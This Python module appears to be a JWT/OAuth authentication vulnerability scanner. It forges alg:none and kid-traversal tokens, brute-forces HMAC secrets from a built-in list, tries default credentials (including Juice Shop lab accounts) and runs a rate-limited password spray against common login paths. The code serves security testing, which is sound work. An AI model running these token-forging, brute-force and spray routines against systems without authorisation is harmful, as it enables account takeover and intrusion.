"""Python-native JWT / OAuth authentication vulnerability tester.

Covers:
1. JWT ``alg:none`` attack — strip signature, change alg to "none"
2. JWT weak HMAC secret brute-force (HS256, 50 common secrets)
3. JWT ``kid`` path traversal (``kid: ../../../../dev/null``)
4. JWT password hash leak — sensitive fields in JWT payload (CWE-200, CWE-312)
5. JWT no expiry — missing ``exp`` claim means token never expires (CWE-613)
6. OAuth ``state`` parameter missing / low-entropy check
7. Bearer token / API key exposure in response body
8. API key in URL query parameters
9. Password spray against discovered login endpoints (CWE-307, CWE-521)

All JWT operations use only Python stdlib (base64, hmac, hashlib, json).
No PyJWT or cryptography dependency required.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qs, urlparse

import httpx

logger = logging.getLogger("security_mcp.scanners.auth_tester")

# ---------------------------------------------------------------------------
# Weak JWT secrets to brute-force
# ---------------------------------------------------------------------------

_WEAK_SECRETS: list[str] = [
    "secret",
    "password",
    "jwt_secret",
    "key",
    "api_key",
    "apikey",
    "token",
    "jwt",
    "change_me",
    "changeme",
    "admin",
    "root",
    "test",
    "123456",
    "1234567890",
    "qwerty",
    "letmein",
    "welcome",
    "abc123",
    "mysecret",
    "jwttoken",
    "jwtsecret",
    "secretkey",
    "private",
    "privatekey",
    "mykey",
    "supersecret",
    "insecure",
    "default",
    "passwd",
    "pass",
    "jwt_key",
    "signing_key",
    "hmac_key",
    "authsecret",
    "auth_secret",
    "app_secret",
    "application_secret",
    "flask_secret",
    "django_secret",
    "rails_secret",
    "express_secret",
    "node_secret",
    "your_secret_here",
    "your-256-bit-secret",
    "HS256secret",
    "256bitsecret",
    "sharedsecret",
    "shared_secret",
    "supersecretpassword",
]

# JWT pattern: base64url.base64url.base64url (signature may be empty)
_JWT_PATTERN = re.compile(r"eyJ[A-Za-z0-9+/\-_=]+\.[A-Za-z0-9+/\-_=]+\.([A-Za-z0-9+/\-_=]*)")

# API key parameter names to look for in URLs
# ---------------------------------------------------------------------------
# Default credentials to test against login endpoints
# ---------------------------------------------------------------------------

_DEFAULT_CREDS: list[tuple[str, str]] = [
    ("admin@juice-sh.op", "admin123"),
    ("jim@juice-sh.op", "ncc-1701"),
    ("bender@juice-sh.op", "OhG0dPlease1nsworkt4me"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("test", "test"),
    ("user", "user"),
]

# Common login endpoint paths
_LOGIN_ENDPOINTS: list[str] = [
    "/login",
    "/api/login",
    "/api/auth/login",
    "/auth/login",
    "/api/v1/login",
    "/api/v1/auth/login",
    "/rest/user/login",
    "/api/authenticate",
    "/api/token",
    "/oauth/token",
    "/api/sessions",
    "/api/v1/sessions",
    "/signin",
    "/api/signin",
    "/admin/login",
    "/user/login",
    "/account/login",
]

# ---------------------------------------------------------------------------
# Password spray constants
# ---------------------------------------------------------------------------

_SPRAY_PASSWORDS: list[str] = [
    "Password1!",
    "password",
    "admin",
    "123456",
    "letmein",
    "welcome1",
    "changeme",
    "qwerty",
    "abc123",
    "password123",
    "admin123",
    "root",
    "test",
    "guest",
    "master",
    "P@ssw0rd",
    "Summer2026!",
    "Winter2026!",
    "Company1!",
    "Welcome1!",
]

_SPRAY_USERNAMES: list[str] = [
    "admin",
    "administrator",
    "root",
    "test",
    "user",
    "guest",
    "demo",
    "operator",
    "manager",
    "support",
]

_SPRAY_DELAY: float = 2.0  # Seconds between attempts -- NOT configurable lower
_SPRAY_MAX_ATTEMPTS: int = 100  # Hard cap on total login attempts

_API_KEY_PARAMS: frozenset[str] = frozenset(
    {
        "api_key",
        "apikey",
        "api-key",
        "token",
        "access_token",
        "auth",
        "auth_token",
        "authorization",
        "key",
        "secret",
        "client_secret",
        "app_key",
        "app_secret",
    }
)


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class AuthVulnerability:
    """A single authentication vulnerability finding."""

    vuln_type: str  # see constants below
    evidence: str
    severity: str  # "critical" | "high" | "medium"
    param: str = ""
    confidence: float = 0.5

    # vuln_type values:
    # "jwt_none_alg"       — alg:none accepted
    # "jwt_weak_secret"    — HS256 secret brute-forced
    # "jwt_kid_injection"  — kid path traversal accepted
    # "jwt_password_leak"  — password hash in JWT payload
    # "jwt_no_expiry"      — missing exp claim (token never expires)
    # "oauth_state_missing" — OAuth state param absent
    # "bearer_exposed"     — JWT/bearer token in response body
    # "api_key_in_url"     — API key in URL query string
    # "spray_valid_creds"  — password spray found valid credentials


@dataclass
class AuthResult:
    """Complete authentication test result."""

    target: str
    vulnerable: bool = False
    vulnerabilities: list[AuthVulnerability] = field(default_factory=list)
    jwts_found: list[str] = field(default_factory=list)
    duration_ms: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        """Serialise to JSON-friendly dict."""
        return {
            "target": self.target,
            "vulnerable": self.vulnerable,
            "vulnerabilities": [
                {
                    "type": v.vuln_type,
                    "severity": v.severity,
                    "param": v.param,
                    "evidence": v.evidence,
                    "confidence": v.confidence,
                }
                for v in self.vulnerabilities
            ],
            "jwts_found": self.jwts_found,
            "duration_ms": round(self.duration_ms, 2),
        }


# ---------------------------------------------------------------------------
# JWT utilities (stdlib only)
# ---------------------------------------------------------------------------


def _b64url_decode(s: str) -> bytes:
    """Decode base64url (with padding fix)."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    """Encode bytes as base64url (no padding)."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _split_jwt(token: str) -> tuple[str, str, str] | None:
    """Split a JWT into (header_b64, payload_b64, signature_b64).

    Returns ``None`` if the token does not look like a JWT.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    return parts[0], parts[1], parts[2]


def _decode_jwt_header(token: str) -> dict[str, Any] | None:
    """Decode the JWT header dict. Returns ``None`` on error."""
    parts = _split_jwt(token)
    if parts is None:
        return None
    try:
        decoded: dict[str, Any] = json.loads(_b64url_decode(parts[0]))
        return decoded
    except (ValueError, UnicodeDecodeError):
        return None


def _decode_jwt_payload(token: str) -> dict[str, Any] | None:
    """Decode the JWT payload dict. Returns ``None`` on error."""
    parts = _split_jwt(token)
    if parts is None:
        return None
    try:
        decoded: dict[str, Any] = json.loads(_b64url_decode(parts[1]))
        return decoded
    except (ValueError, UnicodeDecodeError):
        return None


def _build_none_alg_token(token: str) -> str | None:
    """Build a JWT with ``alg: none`` and no signature.

    Keeps the original payload unchanged.
    """
    parts = _split_jwt(token)
    if parts is None:
        return None
    header_b64, payload_b64, _sig = parts
    try:
        header = json.loads(_b64url_decode(header_b64))
    except (ValueError, UnicodeDecodeError):
        return None
    header["alg"] = "none"
    new_header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_header_b64}.{payload_b64}."


def _sign_hs256(secret: str, header_b64: str, payload_b64: str) -> str:
    """Compute HMAC-SHA256 signature for a JWT header.payload."""
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return _b64url_encode(sig)


def _build_kid_injection_token(token: str) -> str | None:
    """Build a JWT with ``kid: ../../../../dev/null`` signed with empty string.

    On Linux, /dev/null is empty → HMAC-SHA256("", msg) is predictable.
    """
    parts = _split_jwt(token)
    if parts is None:
        return None
    header_b64, payload_b64, _sig = parts
    try:
        header = json.loads(_b64url_decode(header_b64))
    except (ValueError, UnicodeDecodeError):
        return None
    header["alg"] = "HS256"
    header["kid"] = "../../../../dev/null"
    new_header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_sig = _sign_hs256("", new_header_b64, payload_b64)
    return f"{new_header_b64}.{payload_b64}.{new_sig}"


# ---------------------------------------------------------------------------
# Authentication testing engine
# ---------------------------------------------------------------------------


class AuthTester:
    """JWT and OAuth authentication vulnerability tester.

    Parameters
    ----------
    timeout:
        HTTP request timeout in seconds.
    """

    def __init__(self, timeout: float = 10.0) -> None:
        self.timeout = timeout

    async def test(
        self,
        url: str,
        token: str | None = None,
        checks: str = "jwt,creds",
        parsed_headers: dict[str, str] | None = None,
    ) -> AuthResult:
        """Run authentication checks against a URL.

        Args:
            url: Target URL to test.
            token: Optional JWT to test directly (skip discovery).
            checks: Comma-separated check types: ``jwt``, ``creds``, ``spray``.
                    Default is ``"jwt,creds"``.
            parsed_headers: Optional dict of HTTP headers to include in requests.

        Returns:
            ``AuthResult`` with all discovered vulnerabilities.
        """
        start = time.monotonic()
        result = AuthResult(target=url)
        active_checks = {c.strip().lower() for c in checks.split(",") if c.strip()}
        hdrs = parsed_headers or {}

        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
        ) as client:
            # Step 1: Fetch the page to collect tokens and scan for static issues
            response = await self._fetch_response(client, url)
            raw_output = response.text if response is not None else ""

            # Step 2: Passive checks (always run — lightweight)
            self._check_api_key_in_url(url, result)
            self._check_bearer_exposed(raw_output, result)
            self._check_oauth_state(raw_output, url, result)

            # Step 2.5: Active credential checks
            if "creds" in active_checks:
                await self._test_default_credentials(client, url, result)

            # Step 3: Active JWT checks (require a token)
            if "jwt" in active_checks:
                jwts = (
                    [token]
                    if token
                    else self._extract_all_jwts(response) if response is not None else []
                )
                result.jwts_found = [j[:40] + "..." for j in jwts]  # truncate for safety

                for jwt_token in jwts:
                    # Passive JWT payload checks (no HTTP requests needed)
                    self._check_password_in_jwt(jwt_token, result)
                    self._check_no_expiry(jwt_token, result)
                    # Active JWT attacks (require HTTP requests)
                    await self._check_none_alg(client, url, jwt_token, result)
                    await self._check_weak_secret(client, url, jwt_token, result)
                    await self._check_kid_injection(client, url, jwt_token, result)

            # Step 4: Password spray (only when explicitly requested)
            if "spray" in active_checks:
                spray_vulns = await self._spray_credentials(url, hdrs)
                for sv in spray_vulns:
                    result.vulnerabilities.append(
                        AuthVulnerability(
                            vuln_type=sv["type"],
                            severity=sv["severity"],
                            param=sv.get("param", ""),
                            evidence=sv["evidence"],
                            confidence=sv.get("confidence", 0.9),
                        )
                    )
                    result.vulnerable = True

        result.duration_ms = (time.monotonic() - start) * 1000
        logger.info(
            "Auth test complete: %s — checks=%s, %d vulns, %.0fms",
            url,
            checks,
            len(result.vulnerabilities),
            result.duration_ms,
        )
        return result

    # ------------------------------------------------------------------
    # HTTP helper
    # ------------------------------------------------------------------

    async def _fetch_response(self, client: httpx.AsyncClient, url: str) -> httpx.Response | None:
        """Fetch the page and return the full response (headers + body)."""
        try:
            return await client.get(url)
        except httpx.HTTPError as exc:
            logger.debug("Auth tester fetch error: %s", exc)
            return None

    async def _fetch_page(self, client: httpx.AsyncClient, url: str) -> str:
        """Fetch the page and return response body as string."""
        resp = await self._fetch_response(client, url)
        return resp.text if resp is not None else ""

    async def _try_request_with_token(
        self,
        client: httpx.AsyncClient,
        url: str,
        token: str,
    ) -> httpx.Response | None:
        """Send a request with the given token as Bearer."""
        try:
            return await client.get(url, headers={"Authorization": f"Bearer {token}"})
        except httpx.HTTPError:
            return None

    # ------------------------------------------------------------------
    # Passive checks
    # ------------------------------------------------------------------

    def _check_api_key_in_url(self, url: str, result: AuthResult) -> None:
        """Detect API keys / tokens in the URL query string."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        for param in qs:
            if param.lower() in _API_KEY_PARAMS:
                result.vulnerabilities.append(
                    AuthVulnerability(
                        vuln_type="api_key_in_url",
                        severity="high",
                        param=param,
                        evidence=(
                            f"Sensitive parameter '{param}' found in URL query string. "
                            f"API keys/tokens in URLs are logged by proxies, "
                            f"browsers, and web servers."
                        ),
                        confidence=0.8,
                    )
                )
                result.vulnerable = True

    def _check_bearer_exposed(self, body: str, result: AuthResult) -> None:
        """Detect JWT / Bearer tokens exposed in the response body."""
        for match in _JWT_PATTERN.finditer(body):
            token = match.group(0)
            # Only flag if it looks like a real JWT (header decodes successfully)
            if _decode_jwt_header(token) is not None:
                result.vulnerabilities.append(
                    AuthVulnerability(
                        vuln_type="bearer_exposed",
                        severity="high",
                        evidence=(
                            f"JWT token found exposed in response body: "
                            f"{token[:60]}… "
                            f"Exposed tokens may be stolen via XSS or logs."
                        ),
                        confidence=0.5,
                    )
                )
                result.vulnerable = True
                break  # Report once per page

    def _check_oauth_state(self, body: str, url: str, result: AuthResult) -> None:
        """Check OAuth flows for missing or low-entropy state parameter."""
        # Look for OAuth redirect patterns in body
        oauth_patterns = [
            r"response_type=code",
            r"client_id=",
            r"oauth/authorize",
            r"oauth2/authorize",
            r"/authorize\?",
        ]
        is_oauth = any(re.search(p, body, re.IGNORECASE) for p in oauth_patterns)

        if not is_oauth:
            # Also check the URL itself
            is_oauth = "oauth" in url.lower() or "authorize" in url.lower()

        if not is_oauth:
            return

        # Check for state parameter
        state_in_body = re.search(r"[?&]state=([^&\"'\s]+)", body)
        state_in_url = re.search(r"[?&]state=([^&\"'\s]+)", url)
        state_value = state_in_url or state_in_body

        if state_value is None:
            result.vulnerabilities.append(
                AuthVulnerability(
                    vuln_type="oauth_state_missing",
                    severity="high",
                    evidence=(
                        "OAuth authorization flow detected without a 'state' parameter. "
                        "Missing state parameter enables CSRF against the OAuth flow."
                    ),
                    confidence=0.3,
                )
            )
            result.vulnerable = True
        else:
            # Check entropy: state should be at least 16 bytes (32 hex chars)
            sv = state_value.group(1)
            if len(sv) < 16:
                result.vulnerabilities.append(
                    AuthVulnerability(
                        vuln_type="oauth_state_missing",
                        severity="medium",
                        param="state",
                        evidence=(
                            f"OAuth 'state' parameter has low entropy: '{sv}'. "
                            f"State should be at least 128 bits (32 hex chars) of "
                            f"cryptographically random data."
                        ),
                        confidence=0.3,
                    )
                )
                result.vulnerable = True

    # ------------------------------------------------------------------
    # JWT extraction
    # ------------------------------------------------------------------

    def _extract_jwts(self, body: str) -> list[str]:
        """Extract all JWT tokens from a text string."""
        tokens: list[str] = []
        seen: set[str] = set()
        for match in _JWT_PATTERN.finditer(body):
            token = match.group(0)
            if token not in seen and _decode_jwt_header(token) is not None:
                tokens.append(token)
                seen.add(token)
        return tokens

    def _extract_all_jwts(self, response: httpx.Response) -> list[str]:
        """Extract JWTs from response body, Set-Cookie headers, and auth headers.

        Searches multiple locations where JWTs commonly appear:
        - Response body text
        - ``Set-Cookie`` headers
        - ``Authorization``, ``X-Auth-Token``, ``X-JWT`` response headers

        Returns:
            Deduplicated list of valid JWT strings.
        """
        seen: set[str] = set()
        all_tokens: list[str] = []

        def _collect(text: str) -> None:
            for token in self._extract_jwts(text):
                if token not in seen:
                    seen.add(token)
                    all_tokens.append(token)

        # Body text
        _collect(response.text)

        # Set-Cookie headers
        for cookie_header in response.headers.get_list("set-cookie"):
            _collect(cookie_header)

        # Common auth response headers
        for header_name in ("authorization", "x-auth-token", "x-jwt"):
            header_val = response.headers.get(header_name, "")
            if header_val:
                _collect(header_val)

        return all_tokens

    # ------------------------------------------------------------------
    # Passive JWT payload checks
    # ------------------------------------------------------------------

    def _check_password_in_jwt(self, token: str, result: AuthResult) -> None:
        """Flag if the JWT payload contains a password hash or secret field.

        Leaking password hashes in JWT payloads is a common misconfiguration
        that enables offline cracking (CWE-200, CWE-312).
        """
        payload = _decode_jwt_payload(token)
        if payload is None:
            return

        # Fields that should never appear in a JWT payload
        sensitive_fields = ("password", "passwd", "pass", "pwd", "secret", "totpSecret")
        for field_name in sensitive_fields:
            if field_name in payload:
                value = str(payload[field_name])
                result.vulnerabilities.append(
                    AuthVulnerability(
                        vuln_type="jwt_password_leak",
                        severity="high",
                        param=field_name,
                        evidence=(
                            f"JWT payload contains sensitive field '{field_name}': "
                            f"{value[:40]}{'…' if len(value) > 40 else ''}. "
                            f"Password hashes or secrets in JWTs are visible to any "
                            f"token holder and enable offline cracking."
                        ),
                        confidence=0.5,
                    )
                )
                result.vulnerable = True

    def _check_no_expiry(self, token: str, result: AuthResult) -> None:
        """Flag if the JWT payload has no ``exp`` claim (token never expires).

        Tokens without expiration remain valid indefinitely, meaning a stolen
        token cannot be revoked by time alone (CWE-613).
        """
        payload = _decode_jwt_payload(token)
        if payload is None:
            return

        if "exp" not in payload:
            result.vulnerabilities.append(
                AuthVulnerability(
                    vuln_type="jwt_no_expiry",
                    severity="high",
                    evidence=(
                        "JWT has no 'exp' (expiration) claim. The token never expires, "
                        "meaning a stolen token remains valid indefinitely. "
                        "Implement token expiration (CWE-613)."
                    ),
                    confidence=0.3,
                )
            )
            result.vulnerable = True

    # ------------------------------------------------------------------
    # Active JWT attacks
    # ------------------------------------------------------------------

    async def _check_none_alg(
        self,
        client: httpx.AsyncClient,
        url: str,
        token: str,
        result: AuthResult,
    ) -> None:
        """Test alg:none attack — server may accept unsigned token."""
        tampered = _build_none_alg_token(token)
        if tampered is None:
            return

        resp = await self._try_request_with_token(client, url, tampered)
        if resp is None:
            return

        # 200 with tampered token (and original was not 200 with empty token)
        if resp.status_code == 200:
            result.vulnerabilities.append(
                AuthVulnerability(
                    vuln_type="jwt_none_alg",
                    severity="critical",
                    evidence=(
                        f"Server accepted JWT with alg:none (unsigned token). "
                        f"Response status: {resp.status_code}. "
                        f"An attacker can forge any claims without knowing the secret."
                    ),
                    confidence=0.7,
                )
            )
            result.vulnerable = True

    async def _check_weak_secret(
        self,
        client: httpx.AsyncClient,
        url: str,
        token: str,
        result: AuthResult,
    ) -> None:
        """Brute-force common HS256 secrets."""
        header = _decode_jwt_header(token)
        if header is None or header.get("alg") not in ("HS256", "HS384", "HS512"):
            return

        parts = _split_jwt(token)
        if parts is None:
            return
        header_b64, payload_b64, original_sig = parts

        for secret in _WEAK_SECRETS:
            computed_sig = _sign_hs256(secret, header_b64, payload_b64)
            if computed_sig == original_sig:
                result.vulnerabilities.append(
                    AuthVulnerability(
                        vuln_type="jwt_weak_secret",
                        severity="critical",
                        evidence=(f"JWT HMAC secret brute-forced: '{secret}'. An attacker can forge any JWT claims."),
                        confidence=0.9,
                    )
                )
                result.vulnerable = True
                return  # One match is enough

    async def _test_default_credentials(
        self,
        client: httpx.AsyncClient,
        url: str,
        result: AuthResult,
    ) -> None:
        """Test default / well-known credentials against login endpoints.

        Tries each credential pair in ``_DEFAULT_CREDS`` against common login
        endpoint paths. A successful login (200 with token in response) is
        reported as a Critical finding (CWE-798: Hard-coded Credentials).
        """
        parsed = urlparse(url)
        base_origin = f"{parsed.scheme}://{parsed.netloc}"

        for login_path in _LOGIN_ENDPOINTS:
            login_url = f"{base_origin}{login_path}"
            for email, password in _DEFAULT_CREDS:
                try:
                    resp = await client.post(
                        login_url,
                        json={"email": email, "password": password},
                        headers={"Content-Type": "application/json"},
                    )
                except httpx.HTTPError:
                    continue

                if resp.status_code != 200:
                    continue

                # Check if response contains an auth token (JWT or session)
                body_text = resp.text
                has_token = (
                    "token" in body_text.lower()
                    or "authentication" in body_text.lower()
                    or _JWT_PATTERN.search(body_text) is not None
                )
                if has_token:
                    result.vulnerabilities.append(
                        AuthVulnerability(
                            vuln_type="default_credentials",
                            severity="critical",
                            param=login_path,
                            evidence=(
                                f"Default credentials accepted: {email} / {password} "
                                f"on {login_path}. Server returned 200 with auth token. "
                                f"Hard-coded credentials enable full account takeover (CWE-798)."
                            ),
                            confidence=0.9,
                        )
                    )
                    result.vulnerable = True
                    # Also extract JWTs from the response for further testing
                    for jwt_token in self._extract_jwts(body_text):
                        if jwt_token not in result.jwts_found:
                            result.jwts_found.append(jwt_token[:40] + "…")
                    return  # One confirmed default cred is enough

    async def _check_kid_injection(
        self,
        client: httpx.AsyncClient,
        url: str,
        token: str,
        result: AuthResult,
    ) -> None:
        """Test kid path traversal with /dev/null (empty secret)."""
        header = _decode_jwt_header(token)
        if header is None:
            return
        # Only test if the JWT already has a kid claim or uses HS256
        if "kid" not in header and header.get("alg") not in ("HS256", "HS384", "HS512"):
            return

        tampered = _build_kid_injection_token(token)
        if tampered is None:
            return

        resp = await self._try_request_with_token(client, url, tampered)
        if resp is None:
            return

        if resp.status_code == 200:
            result.vulnerabilities.append(
                AuthVulnerability(
                    vuln_type="jwt_kid_injection",
                    severity="critical",
                    evidence=(
                        f"JWT kid path traversal to /dev/null accepted (signed with empty secret). "
                        f"Response status: {resp.status_code}. "
                        f"An attacker can forge any JWT claims."
                    ),
                    confidence=0.7,
                )
            )
            result.vulnerable = True

    # ------------------------------------------------------------------
    # Password spray
    # ------------------------------------------------------------------

    async def _spray_credentials(
        self,
        base_url: str,
        parsed_headers: dict[str, str],
    ) -> list[dict[str, Any]]:
        """Spray common username/password pairs against discovered login endpoints.

        This method:
        1. Discovers live login endpoints by probing ``_LOGIN_ENDPOINTS``.
        2. Auto-detects the expected JSON payload format per endpoint.
        3. Iterates username x password combinations with a mandatory delay.
        4. Stops on first successful login or after ``_SPRAY_MAX_ATTEMPTS``.

        Returns:
            List of vulnerability dicts for each successful login discovered.
        """
        parsed = urlparse(base_url)
        base_origin = f"{parsed.scheme}://{parsed.netloc}"
        findings: list[dict[str, Any]] = []

        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
        ) as client:
            # --- Phase 1: Discover live login endpoints ---
            live_endpoints: list[str] = []
            for path in _LOGIN_ENDPOINTS:
                ep = f"{base_origin}{path}"
                try:
                    # OPTIONS first (lightweight); fall back to GET
                    resp = await client.options(ep, headers=parsed_headers)
                    if resp.status_code in (200, 204, 405):
                        live_endpoints.append(ep)
                        continue
                    resp = await client.get(ep, headers=parsed_headers)
                    if resp.status_code not in (404, 410):
                        live_endpoints.append(ep)
                except httpx.HTTPError:
                    continue

            if not live_endpoints:
                logger.debug("Spray: no live login endpoints discovered at %s", base_origin)
                return findings

            logger.info("Spray: %d live login endpoints found at %s", len(live_endpoints), base_origin)

            # --- Phase 2: Spray each live endpoint ---
            total_attempts = 0

            for ep in live_endpoints:
                # Auto-detect payload format by trying a throwaway request
                payload_format = await self._detect_login_format(client, ep, parsed_headers)
                if payload_format is None:
                    continue

                for username in _SPRAY_USERNAMES:
                    if total_attempts >= _SPRAY_MAX_ATTEMPTS:
                        logger.info("Spray: hit %d attempt cap, stopping", _SPRAY_MAX_ATTEMPTS)
                        return findings

                    for password in _SPRAY_PASSWORDS:
                        if total_attempts >= _SPRAY_MAX_ATTEMPTS:
                            return findings

                        total_attempts += 1
                        payload = self._build_login_payload(payload_format, username, password)

                        try:
                            resp = await client.post(
                                ep,
                                json=payload,
                                headers={**parsed_headers, "Content-Type": "application/json"},
                            )
                        except httpx.HTTPError:
                            await asyncio.sleep(_SPRAY_DELAY)
                            continue

                        if self._is_login_success(resp):
                            logger.warning(
                                "Spray: valid credentials found — %s:%s on %s",
                                username,
                                password,
                                ep,
                            )
                            findings.append(
                                {
                                    "type": "spray_valid_creds",
                                    "severity": "critical",
                                    "param": ep,
                                    "evidence": (
                                        f"Password spray found valid credentials: "
                                        f"username='{username}' password='{password}' "
                                        f"on endpoint {ep}. "
                                        f"Server returned {resp.status_code} with auth token. "
                                        f"Weak/common password accepted (CWE-521). "
                                        f"No account lockout detected after {total_attempts} "
                                        f"attempts (CWE-307)."
                                    ),
                                    "confidence": 0.95,
                                }
                            )
                            # Stop immediately on first success per spec
                            return findings

                        await asyncio.sleep(_SPRAY_DELAY)

        return findings

    async def _detect_login_format(
        self,
        client: httpx.AsyncClient,
        endpoint: str,
        parsed_headers: dict[str, str],
    ) -> str | None:
        """Detect which JSON payload format the login endpoint expects.

        Tries three common shapes with a throwaway credential and returns
        the format key (``"username"``, ``"email"``, or ``"user"``) that
        does NOT produce a 400 Bad Request.  Returns ``None`` if all fail.
        """
        formats = [
            ("username", {"username": "__probe__", "password": "__probe__"}),
            ("email", {"email": "__probe__@probe.test", "password": "__probe__"}),
            ("user", {"user": "__probe__", "pass": "__probe__"}),
        ]
        for fmt_key, payload in formats:
            try:
                resp = await client.post(
                    endpoint,
                    json=payload,
                    headers={**parsed_headers, "Content-Type": "application/json"},
                )
                # 400 means the server rejected the shape itself
                if resp.status_code != 400:
                    return fmt_key
            except httpx.HTTPError:
                continue
        return None

    @staticmethod
    def _build_login_payload(fmt: str, username: str, password: str) -> dict[str, str]:
        """Build a login JSON payload in the detected format."""
        if fmt == "email":
            return {"email": username, "password": password}
        if fmt == "user":
            return {"user": username, "pass": password}
        # default: "username"
        return {"username": username, "password": password}

    @staticmethod
    def _is_login_success(resp: httpx.Response) -> bool:
        """Determine if a login response indicates successful authentication."""
        if resp.status_code != 200:
            return False
        body = resp.text.lower()
        return (
            "token" in body
            or "session" in body
            or "authentication" in body
            or bool(_JWT_PATTERN.search(resp.text))
            or any(
                "set-cookie" in h.lower()
                for h in resp.headers.get_list("set-cookie")
                if "session" in h.lower() or "token" in h.lower()
            )
        )


# ---------------------------------------------------------------------------
# Tool wrapper for ToolRegistry
# ---------------------------------------------------------------------------


async def python_auth_test(url: str, token: str = "", headers: str = "", checks: str = "jwt,creds") -> str:
    """Run JWT and OAuth authentication vulnerability tests against a URL.

    Tests include:
    - JWT alg:none attack, weak HMAC secret, kid traversal
    - OAuth state parameter check
    - Bearer token / API key exposure
    - Default credential testing
    - Password spray (when ``checks`` includes ``"spray"``)

    Args:
        url: Target URL to test.
        token: Optional JWT to test directly (skips JWT discovery).
               Pass a known JWT for targeted alg:none / weak-secret testing.
        headers: Optional comma-separated ``key:value`` headers to include
                 in requests (e.g. ``"Authorization:Bearer xyz,X-Api-Key:abc"``).
        checks: Comma-separated check types to run.  Valid values:
                ``jwt`` (JWT analysis), ``creds`` (default credential test),
                ``spray`` (password spray).  Default: ``"jwt,creds"``.
                Spray must be explicitly opted in.

    Returns:
        JSON string with ``AuthResult`` data.
    """
    # Parse header string into dict
    parsed_headers: dict[str, str] = {}
    if headers:
        for pair in headers.split(","):
            pair = pair.strip()
            if ":" in pair:
                k, v = pair.split(":", 1)
                parsed_headers[k.strip()] = v.strip()

    tester = AuthTester()
    result = await tester.test(url, token=token or None, checks=checks, parsed_headers=parsed_headers)
    return json.dumps(result.to_dict(), indent=2)
